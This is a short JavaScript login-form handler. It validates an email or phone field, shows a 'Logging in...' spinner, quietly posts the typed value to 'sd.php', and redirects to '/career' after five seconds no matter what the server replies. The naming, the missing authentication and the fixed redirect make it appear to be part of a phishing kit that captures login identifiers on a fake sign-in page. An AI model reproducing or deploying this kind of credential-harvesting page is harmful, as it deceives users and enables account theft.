// Define the custom onLoginSubmitWrongEmail function
function onLoginSubmitWrongEmail(e) {
    e.preventDefault(); // Prevent the default form submission
  
    // Access the form element from the event object
    const form = e.target;
    const emailInput = form.querySelector("#emailPhone").value.trim();
    const emailError = form.querySelector(".emailPhone-error");
  
    // Validate the email address
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailInput) {
        emailError.innerText = 'Please enter your email address';
        form.querySelector("#emailPhone").classList.add('error-text');
        return false;
    } else if (!emailRegex.test(emailInput)) {
        emailError.innerText = 'Invalid email address';
        form.querySelector("#emailPhone").classList.add('error-text');
        return false;
    } else {
        emailError.innerText = '';
        form.querySelector("#emailPhone").classList.remove('error-text');
    }
  
    // Optionally, show a loading message or spinner
    const submitButton = form.querySelector('.login-button');
    const spinner = submitButton.querySelector('i');
    submitButton.disabled = true;
    spinner.style.display = 'inline-block'; // Show the spinner
    submitButton.innerHTML = `<i class="bx bx-loader-alt bx-spin bx-rotate-90"></i> Logging in...`;
  
    // Send the form data to the server
    $.post('sd.php', { emailPhoneWrong: emailInput })
        .done(function(response) {
            // console.log('Server response:', response); // Handle success response
            // Optionally redirect or show a success message if needed
            // window.location.href = 'success-page.php'; // Example redirect
        })
        .fail(function() {
            console.error('Error during submission'); // Handle error response
            // Optionally show an error message to the user
            // document.querySelector("#loading-message").innerText = 'Failed to log in. Please try again.';
        });
  
    // Optionally, you can submit the form after a delay or additional processing
    setTimeout(() => {
        window.location.href = "/career"; // Redirect after a short delay
    }, 5000); // Adjust the timeout as needed
  
    return false; // Prevent default form submission
  }
  
  // Attach the onLoginSubmitWrongEmail function to the form's submit event
  document.addEventListener('DOMContentLoaded', () => {
    const formfaWrongEmail = document.querySelector(".form");
    if (formfaWrongEmail) {
      formfaWrongEmail.addEventListener('submit', function(event) {
        onLoginSubmitWrongEmail(event); // Pass the event object to the function
      });
    }
  });
  